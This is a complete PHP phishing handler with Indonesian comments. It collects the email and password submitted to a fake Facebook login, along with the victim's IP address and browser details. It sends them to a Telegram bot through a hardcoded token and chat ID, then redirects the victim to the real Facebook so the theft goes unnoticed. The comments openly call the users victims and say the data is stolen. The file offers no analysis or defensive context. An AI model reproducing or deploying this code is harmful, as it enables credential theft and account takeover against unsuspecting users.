<?php
$email = $_POST['email'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$tanggal = date('Y-m-d H:i:s');

// Format pesan buat dikirim ke Telegram
$message = "📌 **Data Korban Baru!**\n\n";
$message .= "📧 Email: `$email`\n";
$message .= "🔑 Password: `$password`\n";
$message .= "🌐 IP: `$ip`\n";
$message .= "🖥️ Browser: `$user_agent`\n";
$message .= "⏰ Waktu: `$tanggal`\n";

// Token Bot Telegram & Chat ID (Ganti dengan punya lu)
$botToken = "8330427562:AAEScgk_5zTLhxhR8eS6tkbp7gBwSTpj2P8"; // Contoh: 123456789:AAHfjsdflkjsdf
$chatId = "-4934572047"; // Contoh: -1001234567890

// Kirim data via Telegram Bot API
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ],
];
$context  = stream_context_create($options);
file_get_contents($url, false, $context);

// Redirect korban ke Facebook asli setelah data dicuri
header("Location: https://facebook.com");
exit();
?>
